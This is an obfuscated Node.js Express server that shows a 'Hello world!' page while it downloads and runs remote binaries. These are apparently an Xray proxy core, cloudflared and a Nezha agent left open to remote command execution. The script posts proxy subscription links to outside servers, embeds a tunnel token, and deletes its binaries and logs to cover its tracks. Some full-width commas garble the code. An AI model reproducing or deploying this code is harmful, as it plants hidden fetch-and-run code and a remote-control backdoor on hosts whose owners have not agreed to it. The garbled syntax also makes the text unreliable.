const _0x524aaa=_0x4d10;(function(_0x16ad9f,_0x6976f0){const _0x316b97=_0x4d10,_0xb7e2b8=_0x16ad9f();while(!![]){try{const _0xcbdfa9=parseInt(_0x316b97(0xc3))/0x1+-parseInt(_0x316b97(0xbb))/0x2*(parseInt(_0x316b97(0x124))/0x3)+parseInt(_0x316b97(0xe8))/0x4+parseInt(_0x316b97(0xba))/0x5*(parseInt(_0x316b97(0x85))/0x6)+-parseInt(_0x316b97(0x88))/0x7+-parseInt(_0x316b97(0x9b))/0x8+parseInt(_0x316b97(0xad))/0x9;if(_0xcbdfa9===_0x6976f0)break;else _0xb7e2b8['push'](_0xb7e2b8['shift']());}catch(_0x2807de){_0xb7e2b8['push'](_0xb7e2b8['shift']());}}}(_0x166d,0x6c98a));const express=require('express'),app=express(),axios=require(_0x524aaa(0x108)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x524aaa(0x11e)),exec=promisify(require(_0x524aaa(0xf4))[_0x524aaa(0xb6)]),{execSync}=require(_0x524aaa(0xf4)),UPLOAD_URL=process[_0x524aaa(0xe7)][_0x524aaa(0xd3)]||'',PROJECT_URL=process[_0x524aaa(0xe7)][_0x524aaa(0x8e)]||'',AUTO_ACCESS=process[_0x524aaa(0xe7)][_0x524aaa(0x10c)]||![],FILE_PATH=process['env'][_0x524aaa(0xeb)]||_0x524aaa(0xb4),SUB_PATH=process[_0x524aaa(0xe7)][_0x524aaa(0x121)]||_0x524aaa(0xfc),PORT=process[_0x524aaa(0xe7)][_0x524aaa(0xf8)]||process['env'][_0x524aaa(0xd4)]||0xbb8,UUID=process['env']['UUID']||_0x524aaa(0xfd),NEZHA_SERVER=process[_0x524aaa(0xe7)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x524aaa(0xc8)]||'',NEZHA_KEY=process['env'][_0x524aaa(0x8a)]||'',ARGO_DOMAIN=process[_0x524aaa(0xe7)][_0x524aaa(0xa3)]||'rwtun.0.2.a.b.0.4.2.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process[_0x524aaa(0xe7)][_0x524aaa(0xa5)]||_0x524aaa(0x67),ARGO_PORT=process[_0x524aaa(0xe7)][_0x524aaa(0x10a)]||0x1f41,CFIP=process['env'][_0x524aaa(0xd0)]||'test.hiw.qzz.io',CFPORT=process[_0x524aaa(0xe7)][_0x524aaa(0xcd)]||0x1bb,NAME=process[_0x524aaa(0xe7)][_0x524aaa(0x97)]||'Railway';!fs[_0x524aaa(0x94)](FILE_PATH)?(fs[_0x524aaa(0xfe)](FILE_PATH),console[_0x524aaa(0xb0)](FILE_PATH+_0x524aaa(0xed))):console[_0x524aaa(0xb0)](FILE_PATH+_0x524aaa(0xc9));function generateRandomName(){const _0x533a36=_0x524aaa,_0x406de1=_0x533a36(0xd6);let _0x4580d0='';for(let _0x4d233e=0x0;_0x4d233e<0x6;_0x4d233e++){_0x4580d0+=_0x406de1[_0x533a36(0x6a)](Math['floor'](Math[_0x533a36(0x109)]()*_0x406de1[_0x533a36(0x118)]));}return _0x4580d0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x524aaa(0xa7)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x524aaa(0xa7)](FILE_PATH,webName),botPath=path[_0x524aaa(0xa7)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x524aaa(0xec)),listPath=path['join'](FILE_PATH,_0x524aaa(0x7d)),bootLogPath=path['join'](FILE_PATH,_0x524aaa(0xd5)),configPath=path[_0x524aaa(0xa7)](FILE_PATH,_0x524aaa(0x117));function deleteNodes(){const _0x284c7d=_0x524aaa;try{if(!UPLOAD_URL)return;if(!fs[_0x284c7d(0x94)](subPath))return;let _0x4a8989;try{_0x4a8989=fs[_0x284c7d(0x9a)](subPath,_0x284c7d(0x125));}catch{return null;}const _0x4bada2=Buffer['from'](_0x4a8989,'base64')[_0x284c7d(0xd7)](_0x284c7d(0x125)),_0x168750=_0x4bada2[_0x284c7d(0x106)]('\x0a')[_0x284c7d(0xd2)](_0x2c331d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x284c7d(0x83)](_0x2c331d));if(_0x168750[_0x284c7d(0x118)]===0x0)return;return axios['post'](UPLOAD_URL+_0x284c7d(0x112),JSON['stringify']({'nodes':_0x168750}),{'headers':{'Content-Type':_0x284c7d(0x10b)}})['catch'](_0x1c9511=>{return null;}),null;}catch(_0x29e689){return null;}}function _0x166d(){const _0x401fc5=['/vless-argo','sub2','f44e045c-bd57-4cda-980d-464c22803bf0','mkdirSync','chmod','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','isFile','close','\x0aclient_secret:\x20','2053','https+local://8.8.8.8/dns-query','split','arch','axios','random','ARGO_PORT','application/json','AUTO_ACCESS','pkill\x20-f\x20\x22[','then','tunnel.yml','\x0avless://','statSync','/api/delete-nodes','NEZHA\x20variable\x20is\x20empty,skip\x20running','tls','forEach','createWriteStream','config.json','length','?encryption=none&security=tls&sni=','fileName','aarch64','clear','--tls','util','443','nohup\x20','SUB_PATH','catch','&fp=firefox&type=ws&host=','5397SGSGzc','utf-8','substring','/vmess-argo?ed=2560','stream','eyJhIjoiNzlkZWY4MmEyZGY1YjRkMmNhNTg5MTQ3NzcyMWQ4YzQiLCJ0IjoiNDk0MDY3ZmItYjgxNy00YzFiLThmN2UtYjJlNjI3MDA3MjUwIiwicyI6Ik9UazJOemxqWlRNdE5qTTVOaTAwTmpRMkxXSmhaVGN0WlRabFptSmlNR1ppWmpOaCJ9','del\x20/f\x20/q\x20','Hello\x20world!','charAt','\x0a\x20\x20\x0avmess://','Subscription\x20uploaded\x20successfully','true','direct','\x20-s\x20','tunnel.json','https://arm64.ssss.nyc.mn/web','from','/trojan-argo','.exe\x20>\x20nul\x202>&1','push','tcp','stringify','npm\x20running\x20error:\x20','includes','message','all','data','list.txt','8443','/vmess-argo','Empowerment\x20success\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','App\x20is\x20running','test','set','1926594OYNobv','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','vmess','2997785OBNcqk','/api/add-subscriptions','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','status','\x0a\x20\x20\x20\x20','PROJECT_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ArgoDomain:','\x20>/dev/null\x202>&1\x20&','freedom','text/plain;\x20charset=utf-8','existsSync','https://arm64.ssss.nyc.mn/bot','rm\x20-rf\x20','NAME','base64','has','readFileSync','1177096TRKJAf','&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','\x20is\x20running','Empowerment\x20failed\x20for\x20','Nodes\x20uploaded\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/api/add-nodes','ARGO_DOMAIN','/dev/null','ARGO_AUTH','blackhole','join','map','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','post','pop','web\x20running\x20error:\x20','390960xiJBLj','\x0a\x20\x20\x0atrojan://','send','log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/bot','unlinkSync','./tmp','match','exec','2083','http\x20server\x20is\x20running\x20on\x20port:','win32','10dUQtOD','130HDaKDl','php\x20running\x20error:\x20','\x20-p\x20','error','basename','quic','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','404942SfpvAG','\x0a\x20\x20tunnel:\x20','http','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-c\x20\x22','NEZHA_PORT','\x20already\x20exists','readdirSync','unshift','Error\x20reading\x20boot.log:','CFPORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','finish','CFIP','none','filter','UPLOAD_URL','PORT','boot.log','abcdefghijklmnopqrstuvwxyz','toString','get','Error\x20in\x20startserver:','automatic\x20access\x20task\x20added\x20successfully','Download\x20','\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/web','unlink','https://amd64.ssss.nyc.mn/agent','/tunnel.yml\x20run','block','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20failed:\x20','\x0a\x20\x20credentials-file:\x20','Skipping\x20adding\x20automatic\x20access\x20task','env','186228uHCijo','127.0.0.1','pipe','FILE_PATH','sub.txt','\x20is\x20created','https://oooo.serv00.net/add-url','config.yaml','xtls-rprx-vision','TunnelSecret','arm','response','child_process','vless','trojan','https://arm64.ssss.nyc.mn/v1','SERVER_PORT','ARGO_DOMAIN:','trim'];_0x166d=function(){return _0x401fc5;};return _0x166d();}function cleanupOldFiles(){const _0xe88bc5=_0x524aaa;try{const _0x15fb53=fs[_0xe88bc5(0xca)](FILE_PATH);_0x15fb53['forEach'](_0xd65f5d=>{const _0x14a197=_0xe88bc5,_0x365028=path[_0x14a197(0xa7)](FILE_PATH,_0xd65f5d);try{const _0x10c068=fs[_0x14a197(0x111)](_0x365028);_0x10c068[_0x14a197(0x101)]()&&fs['unlinkSync'](_0x365028);}catch(_0x43f31e){}});}catch(_0x196c0e){}}app[_0x524aaa(0xd8)]('/',function(_0x1c9b91,_0x35ddab){const _0xf4eb5=_0x524aaa;_0x35ddab[_0xf4eb5(0xaf)](_0xf4eb5(0x69));});async function generateConfig(){const _0x48a385=_0x524aaa,_0x3167aa={'log':{'access':'/dev/null','error':_0x48a385(0xa4),'loglevel':_0x48a385(0xd1)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x48a385(0xf5),'settings':{'clients':[{'id':UUID,'flow':_0x48a385(0xf0)}],'decryption':_0x48a385(0xd1),'fallbacks':[{'dest':0xbb9},{'path':_0x48a385(0xfb),'dest':0xbba},{'path':_0x48a385(0x7f),'dest':0xbbb},{'path':_0x48a385(0x73),'dest':0xbbc}]},'streamSettings':{'network':_0x48a385(0x76)}},{'port':0xbb9,'listen':_0x48a385(0xe9),'protocol':_0x48a385(0xf5),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x48a385(0x76),'security':'none'}},{'port':0xbba,'listen':_0x48a385(0xe9),'protocol':_0x48a385(0xf5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x48a385(0xd1),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x48a385(0xc5),_0x48a385(0x114),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x48a385(0x87),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x48a385(0x7f)}},'sniffing':{'enabled':!![],'destOverride':[_0x48a385(0xc5),_0x48a385(0x114),_0x48a385(0xc0)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x48a385(0xf6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x48a385(0xd1),'wsSettings':{'path':_0x48a385(0x73)}},'sniffing':{'enabled':!![],'destOverride':[_0x48a385(0xc5),_0x48a385(0x114),_0x48a385(0xc0)],'metadataOnly':![]}}],'dns':{'servers':[_0x48a385(0x105)]},'outbounds':[{'protocol':_0x48a385(0x92),'tag':_0x48a385(0x6e)},{'protocol':_0x48a385(0xa6),'tag':_0x48a385(0xe1)}]};fs[_0x48a385(0x9d)](path[_0x48a385(0xa7)](FILE_PATH,_0x48a385(0x117)),JSON[_0x48a385(0x77)](_0x3167aa,null,0x2));}function getSystemArchitecture(){const _0x26cebb=_0x524aaa,_0x168269=os[_0x26cebb(0x107)]();return _0x168269==='arm'||_0x168269==='arm64'||_0x168269===_0x26cebb(0x11b)?_0x26cebb(0xf2):'amd';}function downloadFile(_0x3005dc,_0x464fb9,_0x27eef5){const _0x4996b6=_0x524aaa,_0x1ace0b=_0x3005dc;!fs[_0x4996b6(0x94)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x126751=fs[_0x4996b6(0x116)](_0x1ace0b);axios({'method':_0x4996b6(0xd8),'url':_0x464fb9,'responseType':_0x4996b6(0x66)})[_0x4996b6(0x10e)](_0x5afe09=>{const _0x26977e=_0x4996b6;_0x5afe09[_0x26977e(0x7c)][_0x26977e(0xea)](_0x126751),_0x126751['on'](_0x26977e(0xcf),()=>{const _0x26adba=_0x26977e;_0x126751[_0x26adba(0x102)](),console[_0x26adba(0xb0)]('Download\x20'+path[_0x26adba(0xbf)](_0x1ace0b)+'\x20successfully'),_0x27eef5(null,_0x1ace0b);}),_0x126751['on'](_0x26977e(0xbe),_0x4fafb2=>{const _0x2e9b22=_0x26977e;fs[_0x2e9b22(0xde)](_0x1ace0b,()=>{});const _0x1ca86f=_0x2e9b22(0xdb)+path[_0x2e9b22(0xbf)](_0x1ace0b)+_0x2e9b22(0xe4)+_0x4fafb2[_0x2e9b22(0x7a)];console[_0x2e9b22(0xbe)](_0x1ca86f),_0x27eef5(_0x1ca86f);});})[_0x4996b6(0x122)](_0x4f0dcb=>{const _0x21a954=_0x4996b6,_0x263272=_0x21a954(0xdb)+path[_0x21a954(0xbf)](_0x1ace0b)+'\x20failed:\x20'+_0x4f0dcb[_0x21a954(0x7a)];console['error'](_0x263272),_0x27eef5(_0x263272);});}function _0x4d10(_0x25a8c8,_0x518ef9){const _0x166d73=_0x166d();return _0x4d10=function(_0x4d10f8,_0x555206){_0x4d10f8=_0x4d10f8-0x65;let _0x3de866=_0x166d73[_0x4d10f8];return _0x3de866;},_0x4d10(_0x25a8c8,_0x518ef9);}async function downloadFilesAndRun(){const _0x28f18f=_0x524aaa,_0x2a6bcf=getSystemArchitecture(),_0x31a9ff=getFilesForArchitecture(_0x2a6bcf);if(_0x31a9ff[_0x28f18f(0x118)]===0x0){console['log'](_0x28f18f(0xc6));return;}const _0x13bba9=_0x31a9ff[_0x28f18f(0xa8)](_0x11d09b=>{return new Promise((_0x2a9da7,_0x29b444)=>{const _0x495d15=_0x4d10;downloadFile(_0x11d09b[_0x495d15(0x11a)],_0x11d09b['fileUrl'],(_0x42b12c,_0x57fa21)=>{_0x42b12c?_0x29b444(_0x42b12c):_0x2a9da7(_0x57fa21);});});});try{await Promise[_0x28f18f(0x7b)](_0x13bba9);}catch(_0x1e89cd){console[_0x28f18f(0xbe)]('Error\x20downloading\x20files:',_0x1e89cd);return;}function _0x5b770c(_0x519984){const _0x33abea=_0x28f18f,_0x37cede=0x1fd;_0x519984[_0x33abea(0x115)](_0x5e54f4=>{const _0x4c26ce=_0x33abea;fs[_0x4c26ce(0x94)](_0x5e54f4)&&fs[_0x4c26ce(0xff)](_0x5e54f4,_0x37cede,_0x63767a=>{const _0x8e6c31=_0x4c26ce;_0x63767a?console[_0x8e6c31(0xbe)](_0x8e6c31(0x9f)+_0x5e54f4+':\x20'+_0x63767a):console[_0x8e6c31(0xb0)](_0x8e6c31(0x80)+_0x5e54f4+':\x20'+_0x37cede[_0x8e6c31(0xd7)](0x8));});});}const _0x5cfe10=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b770c(_0x5cfe10);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5815ca=NEZHA_SERVER[_0x28f18f(0x79)](':')?NEZHA_SERVER[_0x28f18f(0x106)](':')[_0x28f18f(0xab)]():'',_0x5530bd=new Set([_0x28f18f(0x11f),_0x28f18f(0x7e),'2096','2087',_0x28f18f(0xb7),'2053']),_0x4d26b0=_0x5530bd[_0x28f18f(0x99)](_0x5815ca)?_0x28f18f(0x6d):'false',_0x14af75=_0x28f18f(0x103)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4d26b0+_0x28f18f(0xc1)+UUID;fs['writeFileSync'](path[_0x28f18f(0xa7)](FILE_PATH,_0x28f18f(0xef)),_0x14af75);const _0x4181f3=_0x28f18f(0x120)+phpPath+_0x28f18f(0xc7)+FILE_PATH+_0x28f18f(0x86);try{await exec(_0x4181f3),console[_0x28f18f(0xb0)](phpName+_0x28f18f(0x9e)),await new Promise(_0x5a3482=>setTimeout(_0x5a3482,0x3e8));}catch(_0x2d195c){console[_0x28f18f(0xbe)](_0x28f18f(0xbc)+_0x2d195c);}}else{let _0x1c90c1='';const _0x51862f=[_0x28f18f(0x11f),_0x28f18f(0x7e),'2096','2087',_0x28f18f(0xb7),_0x28f18f(0x104)];_0x51862f[_0x28f18f(0x79)](NEZHA_PORT)&&(_0x1c90c1=_0x28f18f(0x11d));const _0x38aef1='nohup\x20'+npmPath+_0x28f18f(0x6f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x28f18f(0xbd)+NEZHA_KEY+'\x20'+_0x1c90c1+_0x28f18f(0xa1);try{await exec(_0x38aef1),console[_0x28f18f(0xb0)](npmName+'\x20is\x20running'),await new Promise(_0x5deec9=>setTimeout(_0x5deec9,0x3e8));}catch(_0x1a6f10){console[_0x28f18f(0xbe)](_0x28f18f(0x78)+_0x1a6f10);}}}else console[_0x28f18f(0xb0)](_0x28f18f(0x113));const _0x5e0494=_0x28f18f(0x120)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e0494),console['log'](webName+_0x28f18f(0x9e)),await new Promise(_0x4749be=>setTimeout(_0x4749be,0x3e8));}catch(_0x213a13){console[_0x28f18f(0xbe)](_0x28f18f(0xac)+_0x213a13);}if(fs['existsSync'](botPath)){let _0x159a03;if(ARGO_AUTH[_0x28f18f(0xb5)](/^[A-Z0-9a-z=]{120,250}$/))_0x159a03='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x159a03=_0x28f18f(0xe3)+FILE_PATH+_0x28f18f(0xe0):_0x159a03=_0x28f18f(0x81)+FILE_PATH+_0x28f18f(0xb1)+ARGO_PORT;try{await exec(_0x28f18f(0x120)+botPath+'\x20'+_0x159a03+_0x28f18f(0x91)),console[_0x28f18f(0xb0)](botName+_0x28f18f(0x9e)),await new Promise(_0x2ed039=>setTimeout(_0x2ed039,0x7d0));}catch(_0x367962){console[_0x28f18f(0xbe)]('Error\x20executing\x20command:\x20'+_0x367962);}}await new Promise(_0xc1ea44=>setTimeout(_0xc1ea44,0x1388));}function getFilesForArchitecture(_0x38cdd0){const _0x395c23=_0x524aaa;let _0x350712;_0x38cdd0===_0x395c23(0xf2)?_0x350712=[{'fileName':webPath,'fileUrl':_0x395c23(0x71)},{'fileName':botPath,'fileUrl':_0x395c23(0x95)}]:_0x350712=[{'fileName':webPath,'fileUrl':_0x395c23(0xdd)},{'fileName':botPath,'fileUrl':_0x395c23(0xb2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2d1a49=_0x38cdd0==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x395c23(0xdf);_0x350712[_0x395c23(0xcb)]({'fileName':npmPath,'fileUrl':_0x2d1a49});}else{const _0x353bb7=_0x38cdd0===_0x395c23(0xf2)?_0x395c23(0xf7):'https://amd64.ssss.nyc.mn/v1';_0x350712[_0x395c23(0xcb)]({'fileName':phpPath,'fileUrl':_0x353bb7});}}return _0x350712;}function argoType(){const _0x163a9c=_0x524aaa;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x163a9c(0xb0)](_0x163a9c(0x8f));return;}if(ARGO_AUTH[_0x163a9c(0x79)](_0x163a9c(0xf1))){fs[_0x163a9c(0x9d)](path[_0x163a9c(0xa7)](FILE_PATH,_0x163a9c(0x70)),ARGO_AUTH);const _0x2cdc28=_0x163a9c(0xc4)+ARGO_AUTH[_0x163a9c(0x106)]('\x22')[0xb]+_0x163a9c(0xe5)+path[_0x163a9c(0xa7)](FILE_PATH,_0x163a9c(0x70))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x163a9c(0x8b)+ARGO_PORT+_0x163a9c(0x100);fs[_0x163a9c(0x9d)](path[_0x163a9c(0xa7)](FILE_PATH,_0x163a9c(0x10f)),_0x2cdc28);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x359bec=_0x524aaa;let _0x5aa62d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5aa62d=ARGO_DOMAIN,console[_0x359bec(0xb0)](_0x359bec(0xf9),_0x5aa62d),await _0x32f580(_0x5aa62d);else try{const _0x58b533=fs['readFileSync'](path[_0x359bec(0xa7)](FILE_PATH,_0x359bec(0xd5)),'utf-8'),_0x4b64d8=_0x58b533[_0x359bec(0x106)]('\x0a'),_0x843ac2=[];_0x4b64d8['forEach'](_0x5d6ab0=>{const _0x1f8e2a=_0x359bec,_0x1795c1=_0x5d6ab0[_0x1f8e2a(0xb5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1795c1){const _0x5bbf9c=_0x1795c1[0x1];_0x843ac2[_0x1f8e2a(0x75)](_0x5bbf9c);}});if(_0x843ac2[_0x359bec(0x118)]>0x0)_0x5aa62d=_0x843ac2[0x0],console[_0x359bec(0xb0)](_0x359bec(0x90),_0x5aa62d),await _0x32f580(_0x5aa62d);else{console[_0x359bec(0xb0)](_0x359bec(0xa9)),fs[_0x359bec(0xb3)](path[_0x359bec(0xa7)](FILE_PATH,_0x359bec(0xd5)));async function _0x735b44(){const _0x127964=_0x359bec;try{process['platform']===_0x127964(0xb9)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x127964(0x74)):await exec(_0x127964(0x10d)+botName[_0x127964(0x6a)](0x0)+']'+botName[_0x127964(0x126)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2f6d11){}}_0x735b44(),await new Promise(_0x47be52=>setTimeout(_0x47be52,0xbb8));const _0x517451=_0x359bec(0x81)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x359bec(0x120)+botPath+'\x20'+_0x517451+_0x359bec(0x91)),console[_0x359bec(0xb0)](botName+'\x20is\x20running'),await new Promise(_0x4c78e8=>setTimeout(_0x4c78e8,0xbb8)),await extractDomains();}catch(_0x587fff){console[_0x359bec(0xbe)]('Error\x20executing\x20command:\x20'+_0x587fff);}}}catch(_0x49be3e){console['error'](_0x359bec(0xcc),_0x49be3e);}async function _0x32f580(_0x3449f1){const _0x50dc25=_0x359bec,_0x74a273=execSync(_0x50dc25(0xc2),{'encoding':_0x50dc25(0x125)}),_0x5a68dd=_0x74a273[_0x50dc25(0xfa)](),_0x3d7260=NAME?NAME+'-'+_0x5a68dd:_0x5a68dd;return new Promise(_0x4acad1=>{setTimeout(()=>{const _0x558084=_0x4d10,_0x2516a8={'v':'2','ps':''+_0x3d7260,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x558084(0xd1),'net':'ws','type':'none','host':_0x3449f1,'path':_0x558084(0x65),'tls':_0x558084(0x114),'sni':_0x3449f1,'alpn':'','fp':'firefox'},_0x2e36ff=_0x558084(0x110)+UUID+'@'+CFIP+':'+CFPORT+_0x558084(0x119)+_0x3449f1+_0x558084(0x123)+_0x3449f1+_0x558084(0x9c)+_0x3d7260+_0x558084(0x6b)+Buffer[_0x558084(0x72)](JSON[_0x558084(0x77)](_0x2516a8))['toString']('base64')+_0x558084(0xae)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3449f1+_0x558084(0x123)+_0x3449f1+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3d7260+_0x558084(0x8d);console[_0x558084(0xb0)](Buffer['from'](_0x2e36ff)[_0x558084(0xd7)](_0x558084(0x98))),fs[_0x558084(0x9d)](subPath,Buffer[_0x558084(0x72)](_0x2e36ff)['toString']('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x558084(0xd8)]('/'+SUB_PATH,(_0x4747b8,_0x18b915)=>{const _0x10e7c4=_0x558084,_0x3f0c30=Buffer['from'](_0x2e36ff)[_0x10e7c4(0xd7)](_0x10e7c4(0x98));_0x18b915[_0x10e7c4(0x84)]('Content-Type',_0x10e7c4(0x93)),_0x18b915[_0x10e7c4(0xaf)](_0x3f0c30);}),_0x4acad1(_0x2e36ff);},0x7d0);});}}async function uploadNodes(){const _0x4df2f6=_0x524aaa;if(UPLOAD_URL&&PROJECT_URL){const _0x4612a7=PROJECT_URL+'/'+SUB_PATH,_0x7c87d9={'subscription':[_0x4612a7]};try{const _0x27b5e0=await axios[_0x4df2f6(0xaa)](UPLOAD_URL+_0x4df2f6(0x89),_0x7c87d9,{'headers':{'Content-Type':'application/json'}});return _0x27b5e0&&_0x27b5e0['status']===0xc8?(console[_0x4df2f6(0xb0)](_0x4df2f6(0x6c)),_0x27b5e0):null;}catch(_0xbd62d2){if(_0xbd62d2[_0x4df2f6(0xf3)]){if(_0xbd62d2[_0x4df2f6(0xf3)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4df2f6(0x94)](listPath))return;const _0x31096b=fs[_0x4df2f6(0x9a)](listPath,_0x4df2f6(0x125)),_0x2711c0=_0x31096b[_0x4df2f6(0x106)]('\x0a')[_0x4df2f6(0xd2)](_0x2e3386=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2e3386));if(_0x2711c0['length']===0x0)return;const _0x5d7f33=JSON[_0x4df2f6(0x77)]({'nodes':_0x2711c0});try{const _0x1c8a32=await axios[_0x4df2f6(0xaa)](UPLOAD_URL+_0x4df2f6(0xa2)，_0x5d7f33,{'headers':{'Content-Type':'application/json'}});return _0x1c8a32&&_0x1c8a32[_0x4df2f6(0x8c)]===0xc8?(console['log'](_0x4df2f6(0xa0))，_0x1c8a32):null;}catch(_0x488a07){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x31aa59=_0x4d10,_0x4f0572=[bootLogPath,configPath,webPath，botPath];if(NEZHA_PORT)_0x4f0572['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4f0572[_0x31aa59(0x75)](phpPath);process['platform']===_0x31aa59(0xb9)?exec(_0x31aa59(0x68)+_0x4f0572[_0x31aa59(0xa7)]('\x20')+_0x31aa59(0xdc),_0x5de5f9=>{const _0x427081=_0x31aa59;console[_0x427081(0x11c)]()，console[_0x427081(0xb0)](_0x427081(0x82))，console['log'](_0x427081(0xce));}):exec(_0x31aa59(0x96)+_0x4f0572[_0x31aa59(0xa7)]('\x20')+_0x31aa59(0xe2)，_0x2e4e36=>{const _0x99539e=_0x31aa59;console[_0x99539e(0x11c)]()，console[_0x99539e(0xb0)](_0x99539e(0x82))，console[_0x99539e(0xb0)](_0x99539e(0xce));});}，0x15f90);}cleanFiles();async function AddVisitTask(){const _0x47335a=_0x524aaa;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x47335a(0xb0)](_0x47335a(0xe6));return;}try{const _0x1b35c9=await axios['post'](_0x47335a(0xee)，{'url':PROJECT_URL}，{'headers':{'Content-Type':_0x47335a(0x10b)}});return console[_0x47335a(0xb0)](_0x47335a(0xda))，_0x1b35c9;}catch(_0x442b72){return console[_0x47335a(0xbe)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x442b72[_0x47335a(0x7a)])，null;}}async function startserver(){const _0xfe949a=_0x524aaa;try{deleteNodes()，cleanupOldFiles(),await generateConfig()，await downloadFilesAndRun()，await extractDomains()，await AddVisitTask();}catch(_0xd25393){console[_0xfe949a(0xbe)](_0xfe949a(0xd9)，_0xd25393);}}startserver()['catch'](_0xece6ff=>{const _0x219b5c=_0x524aaa;console[_0x219b5c(0xbe)]('Unhandled\x20error\x20在\x20startserver:',_0xece6ff);})，app['listen'](PORT，()=>console[_0x524aaa(0xb0)](_0x524aaa(0xb8)+PORT+'!'));
